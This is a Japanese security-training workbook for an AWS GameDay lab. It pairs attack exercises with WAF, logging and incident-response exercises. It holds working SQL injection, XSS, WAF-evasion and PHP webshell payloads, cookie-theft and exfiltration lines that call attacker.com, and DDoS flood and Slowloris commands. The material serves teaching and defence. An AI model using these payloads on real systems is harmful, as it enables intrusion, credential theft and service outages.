# 学習演習ガイド

このガイドでは、AWS GameDay DDoS環境での段階的な学習演習を提供します。各演習は実践的なハンズオン形式で、セキュリティの基本概念から高度な防御策まで体系的に学習できます。

## 演習の構成

### 学習レベル
1. **初級**: セキュリティの基本概念と脆弱性の理解
2. **中級**: 攻撃手法の実践と防御策の実装
3. **上級**: 高度な防御システムの構築と運用

### 演習形式
- **発見演習**: 脆弱性を発見し、その影響を理解する
- **攻撃演習**: 実際の攻撃手法を安全に実践する
- **防御演習**: 適切な防御策を実装し、効果を検証する
- **分析演習**: ログやメトリクスを分析し、インシデントを調査する

## 演習1: SQLインジェクション脆弱性の発見と悪用

### 学習目標
- SQLインジェクション攻撃の仕組みを理解する
- 脆弱なコードを特定する方法を学ぶ
- 攻撃の影響を実際に体験する
- 適切な対策を実装する

### 前提条件
- 基本的なSQL知識
- HTTP リクエスト/レスポンスの理解
- curl コマンドの基本操作

### 演習1.1: 脆弱性の発見

#### ステップ1: アプリケーションの調査
```bash
# 1. アプリケーションにアクセスして機能を確認
curl -I http://<target-url>

# 2. ログイン画面の確認
curl http://<target-url>/login

# 3. 検索機能の確認
curl "http://<target-url>/search?q=test"
```

**質問**: どのような入力フィールドがありますか？これらのフィールドはデータベースクエリに使用される可能性がありますか？

#### ステップ2: 基本的な脆弱性テスト
```bash
# 1. シングルクォートを使用したエラー誘発
curl "http://<target-url>/search?q=test'"

# 期待される結果: SQLエラーメッセージの表示
# 例: "SQLite error: unrecognized token"
```

**質問**: エラーメッセージから何がわかりますか？使用されているデータベースの種類は何ですか？

#### ステップ3: SQLインジェクションの確認
```bash
# 1. 論理演算子を使用したテスト
curl "http://<target-url>/search?q=test' OR '1'='1"

# 2. コメントアウトを使用したテスト
curl "http://<target-url>/search?q=test'-- "
```

**質問**: 結果に変化はありましたか？通常の検索結果と比較してどのような違いがありますか？

### 演習1.2: 攻撃の実行

#### ステップ1: 認証バイパス攻撃
```bash
# 1. 正常なログイン試行
curl -X POST "http://<target-url>/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=testuser&password=wrongpassword"

# 2. SQLインジェクションによる認証バイパス
curl -X POST "http://<target-url>/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin' OR '1'='1-- &password=anything"
```

**課題**: 攻撃が成功した場合、どのような応答が返されますか？セッションクッキーは設定されましたか？

#### ステップ2: データ抽出攻撃
```bash
# 1. テーブル構造の調査
curl "http://<target-url>/search?q=' UNION SELECT name, sql FROM sqlite_master WHERE type='table'-- "

# 2. ユーザーデータの抽出
curl "http://<target-url>/search?q=' UNION SELECT username, password FROM users-- "

# 3. 全データの抽出
curl "http://<target-url>/search?q=' UNION SELECT * FROM users-- "
```

**課題**: どのような機密情報を取得できましたか？パスワードはどのように保存されていますか？

### 演習1.3: 影響の評価

#### ステップ1: 取得したデータの分析
```bash
# 取得したデータをファイルに保存して分析
curl "http://<target-url>/search?q=' UNION SELECT username, password FROM users-- " > extracted_data.html

# データの整理と分析
grep -o 'username.*password' extracted_data.html
```

**課題**: 
1. 何人のユーザーアカウントが漏洩しましたか？
2. 管理者アカウントは含まれていますか？
3. パスワードから推測できるセキュリティポリシーはありますか？

#### ステップ2: 攻撃の拡大可能性評価
```bash
# 1. 他のテーブルの調査
curl "http://<target-url>/search?q=' UNION SELECT name FROM sqlite_master WHERE type='table'-- "

# 2. システム情報の取得（可能な場合）
curl "http://<target-url>/search?q=' UNION SELECT sqlite_version()-- "
```

**課題**: この攻撃を起点として、どのような追加の攻撃が可能ですか？

### 演習1.4: 防御策の実装と検証

#### ステップ1: WAF保護の有効化
```bash
# セキュリティレベルを2に変更
sed -i 's/security_level = 1/security_level = 2/' terraform/terraform.tfvars
cd terraform && terraform apply
```

#### ステップ2: 防御効果の確認
```bash
# 1. 同じ攻撃を再実行
curl -X POST "http://<target-url>/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin' OR '1'='1-- &password=anything"

# 期待される結果: 403 Forbidden
```

#### ステップ3: WAFログの分析
```bash
# WAFログの確認
aws logs filter-log-events \
  --log-group-name "/aws/wafv2/gameday" \
  --filter-pattern "{ $.action = \"BLOCK\" }" \
  --start-time $(date -d '10 minutes ago' +%s)000
```

**課題**: WAFはどのルールで攻撃をブロックしましたか？ブロックされなかった攻撃パターンはありますか？

---

## 演習2: クロスサイトスクリプティング（XSS）脆弱性の発見と悪用

### 学習目標
- XSS攻撃の種類と仕組みを理解する
- 反射型XSSと格納型XSSの違いを学ぶ
- XSS攻撃の実際の影響を体験する
- 効果的な防御策を実装する

### 演習2.1: 反射型XSSの発見

#### ステップ1: 入力フィールドの特定
```bash
# 1. 検索機能の確認
curl "http://<target-url>/search?q=test"

# 2. 入力値がどのように表示されるかを確認
curl "http://<target-url>/search?q=<h1>Test</h1>"
```

**質問**: 入力値はHTMLエスケープされていますか？HTMLタグが解釈されますか？

#### ステップ2: 基本的なXSSペイロードのテスト
```bash
# 1. 基本的なスクリプトタグ
curl "http://<target-url>/search?q=<script>alert('XSS')</script>"

# 2. イベントハンドラーを使用
curl "http://<target-url>/search?q=<img src=x onerror=alert('XSS')>"

# 3. SVGタグを使用
curl "http://<target-url>/search?q=<svg onload=alert('XSS')>"
```

**課題**: どのペイロードが成功しましたか？ブラウザで実際にアクセスしてスクリプトが実行されることを確認してください。

### 演習2.2: 格納型XSSの発見

#### ステップ1: コメント機能の調査
```bash
# 1. コメント投稿機能の確認
curl -X POST "http://<target-url>/comment" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "comment=Normal comment&name=TestUser"

# 2. 投稿されたコメントの表示確認
curl "http://<target-url>/comments"
```

#### ステップ2: 格納型XSSペイロードの投稿
```bash
# 1. 基本的な格納型XSS
curl -X POST "http://<target-url>/comment" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "comment=<script>alert('Stored XSS')</script>&name=Attacker"

# 2. より持続的なペイロード
curl -X POST "http://<target-url>/comment" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "comment=<iframe src=javascript:alert('Persistent XSS')></iframe>&name=Attacker"
```

**課題**: 投稿後、コメントページにアクセスするたびにスクリプトが実行されますか？

### 演習2.3: 高度なXSS攻撃

#### ステップ1: Cookie窃取攻撃
```bash
# 1. 攻撃者のサーバー準備（シミュレーション）
# 実際の環境では外部サーバーを使用
echo "Cookie theft simulation" > /tmp/stolen_cookies.log

# 2. Cookie窃取ペイロード
curl -X POST "http://<target-url>/comment" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "comment=<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>&name=Attacker"
```

#### ステップ2: セッションハイジャック攻撃
```bash
# 1. セッション情報の取得ペイロード
curl -X POST "http://<target-url>/comment" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "comment=<script>fetch('/api/user', {credentials: 'include'}).then(r=>r.text()).then(d=>fetch('http://attacker.com/steal', {method:'POST', body:d}))</script>&name=Attacker"
```

**課題**: これらの攻撃が成功した場合、攻撃者は何を取得できますか？

### 演習2.4: XSS防御の実装と検証

#### ステップ1: WAF保護下でのテスト
```bash
# セキュリティレベル2でのXSSテスト
curl "http://<target-url>/search?q=<script>alert('XSS')</script>"

# 期待される結果: 403 Forbidden
```

#### ステップ2: WAF回避技術のテスト
```bash
# 1. エンコーディングを使用した回避
curl "http://<target-url>/search?q=%3Cscript%3Ealert('XSS')%3C/script%3E"

# 2. 大文字小文字の混在
curl "http://<target-url>/search?q=<ScRiPt>alert('XSS')</ScRiPt>"

# 3. 異なるイベントハンドラー
curl "http://<target-url>/search?q=<body onload=alert('XSS')>"
```

**課題**: WAFを回避できるペイロードはありましたか？どのような回避技術が効果的でしたか？

---

## 演習3: ファイルアップロード脆弱性の発見と悪用

### 学習目標
- ファイルアップロード攻撃の仕組みを理解する
- 様々な回避技術を学ぶ
- Webシェルの概念と危険性を理解する
- 適切なファイル検証の重要性を学ぶ

### 演習3.1: ファイルアップロード機能の調査

#### ステップ1: 基本機能の確認
```bash
# 1. 正常なファイルアップロードのテスト
echo "This is a test file" > test.txt
curl -X POST "http://<target-url>/upload" \
  -F "file=@test.txt"

# 2. アップロードされたファイルの確認
curl "http://<target-url>/uploads/"
```

**質問**: ファイルはどこに保存されますか？アップロードされたファイルに直接アクセスできますか？

#### ステップ2: ファイル制限の調査
```bash
# 1. 大きなファイルのテスト
dd if=/dev/zero of=large.txt bs=1M count=10
curl -X POST "http://<target-url>/upload" \
  -F "file=@large.txt"

# 2. 異なる拡張子のテスト
echo "test" > test.exe
curl -X POST "http://<target-url>/upload" \
  -F "file=@test.exe"
```

**課題**: どのような制限がありますか？エラーメッセージから何がわかりますか？

### 演習3.2: 悪意のあるファイルアップロード

#### ステップ1: Webシェルの作成と投稿
```bash
# 1. 基本的なPHPシェルの作成
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# 2. ファイルのアップロード
curl -X POST "http://<target-url>/upload" \
  -F "file=@shell.php"

# 3. アップロードされたシェルの実行テスト
curl "http://<target-url>/uploads/shell.php?cmd=whoami"
```

**課題**: シェルは正常にアップロードされましたか？コマンドは実行されましたか？

#### ステップ2: 拡張子制限の回避
```bash
# 1. 二重拡張子を使用
echo '<?php system($_GET["cmd"]); ?>' > image.jpg.php
curl -X POST "http://<target-url>/upload" \
  -F "file=@image.jpg.php"

# 2. Content-Typeの偽装
curl -X POST "http://<target-url>/upload" \
  -F "file=@shell.php;type=image/jpeg"

# 3. ファイル名の操作
curl -X POST "http://<target-url>/upload" \
  -F "file=@shell.php" \
  -F "filename=image.jpg"
```

**課題**: どの回避技術が成功しましたか？

### 演習3.3: 高度なファイルアップロード攻撃

#### ステップ1: より高度なWebシェル
```bash
# 1. 多機能Webシェルの作成
cat > advanced_shell.php << 'EOF'
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
if(isset($_POST['upload'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
    echo "File uploaded: " . $_FILES['file']['name'];
}
?>
<form method="post" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="submit" name="upload" value="Upload">
</form>
EOF

# 2. アップロードと実行
curl -X POST "http://<target-url>/upload" \
  -F "file=@advanced_shell.php"
```

#### ステップ2: システム情報の取得
```bash
# アップロードされたシェルを使用してシステム情報を取得
curl "http://<target-url>/uploads/advanced_shell.php?cmd=uname -a"
curl "http://<target-url>/uploads/advanced_shell.php?cmd=id"
curl "http://<target-url>/uploads/advanced_shell.php?cmd=ls -la /"
```

**課題**: どのような情報を取得できましたか？さらなる攻撃の可能性はありますか？

---

## 演習4: DDoS攻撃の実行と防御

### 学習目標
- DDoS攻撃の種類と仕組みを理解する
- 攻撃がシステムに与える影響を測定する
- 段階的な防御策の効果を比較する
- 監視とアラートシステムの重要性を学ぶ

### 演習4.1: 基本的なHTTPフラッド攻撃

#### ステップ1: ベースライン測定
```bash
# 1. 攻撃前のレスポンス時間測定
for i in {1..10}; do
  curl -w "Response time: %{time_total}s\n" -s http://<target-url> > /dev/null
done

# 2. 平均レスポンス時間の計算
for i in {1..10}; do
  curl -w "%{time_total}\n" -s http://<target-url> > /dev/null
done | awk '{sum+=$1} END {print "Average:", sum/NR, "seconds"}'
```

#### ステップ2: HTTPフラッド攻撃の実行
```bash
# 攻撃シミュレーションインスタンスにSSH接続
ssh -i your-key.pem ec2-user@<attack-instance-ip>

# 基本的なDDoS攻撃の実行
./ddos_simulation.sh http://<target-url> 50 60

# 別ターミナルで攻撃中のレスポンス時間を監視
while true; do
  curl -w "$(date): %{time_total}s - %{http_code}\n" -s http://<target-url> > /dev/null
  sleep 2
done
```

**課題**: 
1. レスポンス時間はどの程度増加しましたか？
2. エラーレスポンス（5xx、タイムアウト）の割合はどの程度ですか？
3. 攻撃停止後、どの程度で正常に戻りましたか？

### 演習4.2: 高度なDDoS攻撃パターン

#### ステップ1: Slowloris攻撃
```bash
# Slowloris攻撃の実行
python3 advanced_ddos_simulation.py \
  --target http://<target-url> \
  --attack-type slowloris \
  --connections 100 \
  --duration 120

# 攻撃中のサーバーリソース監視
aws cloudwatch get-metric-statistics \
  --namespace AWS/EC2 \
  --metric-name CPUUtilization \
  --dimensions Name=InstanceId,Value=<instance-id> \
  --start-time $(date -d '5 minutes ago' -u +%Y-%m-%dT%H:%M:%S) \
  --end-time $(date -u +%Y-%m-%dT%H:%M:%S) \
  --period 60 \
  --statistics Average
```

#### ステップ2: 複合攻撃パターン
```bash
# 複数の攻撃を同時実行
./ddos_simulation.sh http://<target-url> 30 120 &
python3 advanced_ddos_simulation.py --target http://<target-url> --attack-type slowloris --connections 50 --duration 120 &
python3 advanced_ddos_simulation.py --target http://<target-url> --attack-type post-flood --threads 20 --duration 120 &
wait
```

**課題**: 単一の攻撃と複合攻撃で影響に違いはありましたか？

### 演習4.3: 段階的防御の効果測定

#### ステップ1: レベル2（WAF基本保護）での攻撃
```bash
# セキュリティレベルを2に変更
sed -i 's/security_level = 1/security_level = 2/' terraform/terraform.tfvars
cd terraform && terraform apply

# 同じ攻撃を再実行
./ddos_simulation.sh http://<target-url> 50 60
```

**課題**: レベル1と比較して、どのような改善が見られましたか？

#### ステップ2: レベル3（Shield Advanced）での攻撃
```bash
# セキュリティレベルを3に変更
sed -i 's/security_level = 2/security_level = 3/' terraform/terraform.tfvars
cd terraform && terraform apply

# より大規模な攻撃を実行
./ddos_simulation.sh http://<target-url> 100 180
```

#### ステップ3: レベル4（CloudFront完全保護）での攻撃
```bash
# セキュリティレベルを4に変更
sed -i 's/security_level = 3/security_level = 4/' terraform/terraform.tfvars
cd terraform && terraform apply

# CloudFrontドメインに対する攻撃
./ddos_simulation.sh https://<cloudfront-domain> 100 180
```

**課題**: 各レベルでの防御効果を数値で比較してください。

---

## 演習5: 監視とインシデント対応

### 学習目標
- セキュリティ監視の重要性を理解する
- ログ分析の技術を習得する
- インシデント対応の基本プロセスを学ぶ
- 予防的セキュリティ対策を実装する

### 演習5.1: ログ分析演習

#### ステップ1: WAFログの分析
```bash
# 1. 攻撃後のWAFログ確認
aws logs filter-log-events \
  --log-group-name "/aws/wafv2/gameday" \
  --start-time $(date -d '1 hour ago' +%s)000

# 2. ブロックされた攻撃の分析
aws logs filter-log-events \
  --log-group-name "/aws/wafv2/gameday" \
  --filter-pattern "{ $.action = \"BLOCK\" }" \
  --start-time $(date -d '1 hour ago' +%s)000

# 3. 攻撃パターンの統計
aws logs filter-log-events \
  --log-group-name "/aws/wafv2/gameday" \
  --filter-pattern "{ $.action = \"BLOCK\" }" \
  --start-time $(date -d '1 hour ago' +%s)000 | \
  jq -r '.events[].message' | jq -r '.terminatingRuleId' | sort | uniq -c
```

**課題**: 
1. 最も多くブロックされた攻撃タイプは何ですか？
2. 攻撃の発生源IPアドレスに傾向はありますか？
3. 時間帯による攻撃パターンの違いはありますか？

#### ステップ2: ALBアクセスログの分析
```bash
# 1. ALBログのダウンロード
aws s3 sync s3://<log-bucket>/AWSLogs/<account-id>/elasticloadbalancing/<region>/ ./alb-logs/

# 2. 攻撃パターンの分析
grep "POST /login" alb-logs/*.log | grep "admin" | wc -l
grep " 403 " alb-logs/*.log | head -10
grep " 5[0-9][0-9] " alb-logs/*.log | wc -l

# 3. レスポンス時間の分析
awk '{print $9}' alb-logs/*.log | sort -n | tail -10
```

**課題**: ログから攻撃の痕跡を特定できますか？

### 演習5.2: GuardDuty検出結果の分析

#### ステップ1: GuardDuty検出結果の確認
```bash
# 1. 検出結果の一覧取得
aws guardduty list-findings --detector-id <detector-id>

# 2. 詳細な検出結果の確認
aws guardduty get-findings \
  --detector-id <detector-id> \
  --finding-ids <finding-id>

# 3. 脅威レベル別の分類
aws guardduty list-findings --detector-id <detector-id> | \
  jq -r '.FindingIds[]' | \
  xargs -I {} aws guardduty get-findings --detector-id <detector-id> --finding-ids {} | \
  jq -r '.Findings[].Severity'
```

**課題**: GuardDutyはどのような脅威を検出しましたか？

### 演習5.3: インシデント対応演習

#### ステップ1: インシデントの検知
```bash
# 1. 異常なトラフィックパターンの検知
aws cloudwatch get-metric-statistics \
  --namespace AWS/ApplicationELB \
  --metric-name RequestCount \
  --dimensions Name=LoadBalancer,Value=<alb-name> \
  --start-time $(date -d '1 hour ago' -u +%Y-%m-%dT%H:%M:%S) \
  --end-time $(date -u +%Y-%m-%dT%H:%M:%S) \
  --period 300 \
  --statistics Sum

# 2. エラー率の急増確認
aws cloudwatch get-metric-statistics \
  --namespace AWS/ApplicationELB \
  --metric-name HTTPCode_Target_5XX_Count \
  --dimensions Name=LoadBalancer,Value=<alb-name> \
  --start-time $(date -d '1 hour ago' -u +%Y-%m-%dT%H:%M:%S) \
  --end-time $(date -u +%Y-%m-%dT%H:%M:%S) \
  --period 300 \
  --statistics Sum
```

#### ステップ2: 初期対応
```bash
# 1. 攻撃源IPの特定
aws logs filter-log-events \
  --log-group-name "/aws/wafv2/gameday" \
  --filter-pattern "{ $.action = \"BLOCK\" }" \
  --start-time $(date -d '10 minutes ago' +%s)000 | \
  jq -r '.events[].message' | jq -r '.httpRequest.clientIP' | sort | uniq -c | sort -nr

# 2. 緊急ブロックルールの追加（シミュレーション）
echo "Emergency IP block rule would be added here"

# 3. ステークホルダーへの通知（シミュレーション）
echo "Incident notification would be sent here"
```

#### ステップ3: 詳細調査
```bash
# 1. 攻撃タイムラインの作成
aws logs filter-log-events \
  --log-group-name "/aws/wafv2/gameday" \
  --start-time $(date -d '2 hours ago' +%s)000 | \
  jq -r '.events[] | "\(.eventTime) \(.message | fromjson | .action) \(.message | fromjson | .httpRequest.clientIP)"' | \
  sort

# 2. 影響範囲の評価
aws cloudwatch get-metric-statistics \
  --namespace AWS/ApplicationELB \
  --metric-name TargetResponseTime \
  --dimensions Name=LoadBalancer,Value=<alb-name> \
  --start-time $(date -d '2 hours ago' -u +%Y-%m-%dT%H:%M:%S) \
  --end-time $(date -u +%Y-%m-%dT%H:%M:%S) \
  --period 300 \
  --statistics Average,Maximum
```

**課題**: インシデントの根本原因は何ですか？どのような改善策が必要ですか？

---

## 演習6: 総合セキュリティ評価

### 学習目標
- 学習した内容を統合して総合的なセキュリティ評価を実施する
- 実際のペネトレーションテストの流れを体験する
- セキュリティ改善提案を作成する
- 継続的なセキュリティ監視の重要性を理解する

### 演習6.1: 包括的脆弱性評価

#### ステップ1: 自動化されたセキュリティスキャン
```bash
# 1. 全脆弱性タイプの自動テスト
./scripts/master_security_test.sh <target-url>

# 2. 結果の分析
cat security_test_results.json | jq '.vulnerabilities[] | select(.status == "vulnerable")'

# 3. リスクレベル別の分類
cat security_test_results.json | jq '.vulnerabilities[] | .risk_level' | sort | uniq -c
```

#### ステップ2: 手動検証
```bash
# 1. 自動スキャンで検出された脆弱性の手動確認
# SQLインジェクション
curl -X POST "http://<target-url>/login" \
  -d "username=admin' OR '1'='1-- &password=test"

# XSS
curl "http://<target-url>/search?q=<script>alert('manual_test')</script>"

# ファイルアップロード
echo '<?php echo "manual_test"; ?>' > manual_test.php
curl -X POST "http://<target-url>/upload" -F "file=@manual_test.php"
```

### 演習6.2: セキュリティ改善提案の作成

#### ステップ1: 現状分析
```bash
# 1. 各セキュリティレベルでの防御効果をまとめる
echo "Security Level Analysis:" > security_analysis.md
echo "========================" >> security_analysis.md

for level in 1 2 3 4; do
  echo "Level $level:" >> security_analysis.md
  # 各レベルでのテスト結果を記録
  ./scripts/test_security_level.sh $level >> security_analysis.md
done
```

#### ステップ2: 改善提案の作成
```markdown
# セキュリティ改善提案書

## 現状の脆弱性
1. **SQLインジェクション**: レベル1で100%成功、レベル2で30%成功
2. **XSS**: レベル1で100%成功、レベル2で40%成功
3. **ファイルアップロード**: レベル1で100%成功、レベル2で60%成功

## 推奨改善策
1. **アプリケーションレベル**:
   - パラメータ化クエリの実装
   - 入力値の適切なサニタイゼーション
   - ファイルアップロードの厳格な検証

2. **インフラストラクチャレベル**:
   - WAFルールのカスタマイズ
   - レート制限の最適化
   - 監視アラートの改善

3. **運用レベル**:
   - 定期的なセキュリティテスト
   - インシデント対応手順の整備
   - セキュリティ教育の実施
```

### 演習6.3: 継続的監視システムの構築

#### ステップ1: 自動監視スクリプトの作成
```bash
#!/bin/bash
# continuous_monitoring.sh

while true; do
  # 1. 基本的なヘルスチェック
  response_time=$(curl -w "%{time_total}" -s http://<target-url> > /dev/null)
  
  # 2. 異常検知
  if (( $(echo "$response_time > 5.0" | bc -l) )); then
    echo "$(date): High response time detected: ${response_time}s"
    # アラート送信（シミュレーション）
  fi
  
  # 3. セキュリティテスト
  sql_test=$(curl -s -X POST "http://<target-url>/login" \
    -d "username=admin' OR '1'='1-- &password=test" | grep -c "Welcome")
  
  if [ "$sql_test" -gt 0 ]; then
    echo "$(date): SQL injection vulnerability detected!"
    # 緊急アラート送信（シミュレーション）
  fi
  
  sleep 300  # 5分間隔
done
```

#### ステップ2: ダッシュボードの活用
```bash
# CloudWatchダッシュボードのURL生成
echo "Dashboard URL: https://console.aws.amazon.com/cloudwatch/home?region=$(aws configure get region)#dashboards:name=GameDay-Security-Dashboard"

# カスタムメトリクスの送信
aws cloudwatch put-metric-data \
  --namespace "GameDay/Security" \
  --metric-data MetricName=VulnerabilityCount,Value=3,Unit=Count
```

---

## 学習成果の評価

### 評価基準

#### 技術スキル評価
1. **脆弱性発見能力** (25点)
   - SQLインジェクション: 発見(5点) + 悪用(5点)
   - XSS: 発見(5点) + 悪用(5点)
   - ファイルアップロード: 発見(3点) + 悪用(2点)

2. **攻撃実行能力** (25点)
   - DDoS攻撃: 基本(10点) + 高度(10点)
   - 複合攻撃: 計画(3点) + 実行(2点)

3. **防御実装能力** (25点)
   - WAF設定: 基本(10点) + カスタマイズ(5点)
   - 監視設定: 基本(5点) + 高度(5点)

4. **分析・対応能力** (25点)
   - ログ分析: 基本(10点) + 高度(5点)
   - インシデント対応: 検知(5点) + 対応(5点)

#### 理解度評価チェックリスト

##### 基本レベル (60点以上で合格)
- [ ] SQLインジェクション攻撃を実行し、その影響を説明できる
- [ ] XSS攻撃を実行し、その危険性を理解している
- [ ] DDoS攻撃の基本的な仕組みを理解している
- [ ] WAFの基本的な保護機能を説明できる
- [ ] ログから攻撃の痕跡を特定できる

##### 中級レベル (75点以上で合格)
- [ ] 複数の脆弱性を組み合わせた攻撃を計画・実行できる
- [ ] WAFの回避技術を理解し、実践できる
- [ ] CloudWatchメトリクスを分析し、異常を検知できる
- [ ] インシデント対応の基本的な流れを実践できる
- [ ] セキュリティ改善提案を作成できる

##### 上級レベル (90点以上で合格)
- [ ] 高度な攻撃パターンを設計・実行できる
- [ ] 多層防御システムの効果を定量的に評価できる
- [ ] 継続的なセキュリティ監視システムを構築できる
- [ ] 包括的なセキュリティ評価を実施できる
- [ ] 実際のペネトレーションテストを計画・実行できる

### 最終課題

#### 総合演習: セキュリティコンサルタントとしての提案
あなたはセキュリティコンサルタントとして、この環境の包括的なセキュリティ評価を実施し、クライアントに改善提案を行う必要があります。

**課題内容**:
1. 全ての脆弱性を発見し、その影響を評価する
2. 各セキュリティレベルでの防御効果を定量的に測定する
3. 攻撃シナリオを作成し、実際に実行する
4. ログ分析により攻撃の痕跡を特定する
5. 包括的なセキュリティ改善提案書を作成する

**提出物**:
- セキュリティ評価レポート (技術的詳細を含む)
- 改善提案書 (経営層向けサマリーを含む)
- 実行したテストの証跡 (ログ、スクリーンショット等)

**評価ポイント**:
- 技術的な正確性と深度
- 実践的な改善提案の質
- ビジネス影響の理解
- プレゼンテーション能力

この総合演習を通じて、実際のセキュリティコンサルティング業務に必要なスキルを習得できます。